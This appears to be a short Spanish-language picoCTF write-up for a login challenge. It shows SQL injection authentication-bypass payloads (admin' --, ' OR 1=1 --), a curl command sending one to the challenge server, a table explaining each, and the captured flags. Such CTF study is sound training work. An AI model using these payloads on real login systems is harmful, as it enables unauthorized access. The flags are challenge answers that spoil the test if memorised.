picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}#### Description

Do you think you can log us in? Try to see if you can login! http://fickle-tempest.picoctf.net:65141.

Primero al inspeccionar hay un input oculto que al cambiar el valor te da la query que se uso para intentar logearse al sistem

```
username: ewwetr
password: wef
SQL query: SELECT * FROM users WHERE name='ewwetr' AND password='wef'
```

A la query añadirle lo siguiente

```
username: admin' --
password: fsdg
SQL query: SELECT * FROM users WHERE name='admin' --' AND password='fsdg'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}

adrian' or 1=1 --

curl -s "link" -d "username=admin' -- &password = loquesea&debug=1"
```

### Referencias: 

| Payload             | Técnica principal         | Qué logra realmente                         | Cuándo es útil                              |
| ------------------- | ------------------------- | ------------------------------------------- | ------------------------------------------- |
| `admin' --`         | Comentario `--`           | Elimina la verificación de contraseña       | Cuando conoces un usuario válido            |
| `' OR 1=1 --`       | OR verdadero + comentario | Hace que la condición siempre sea verdadera | Cuando no sabes ningún usuario (o da igual) |
| `adrian' or 1=1 --` | Igual que arriba          | Lo mismo, pero finge ser "adrian"           | Variante más "limpia" visualmente           |
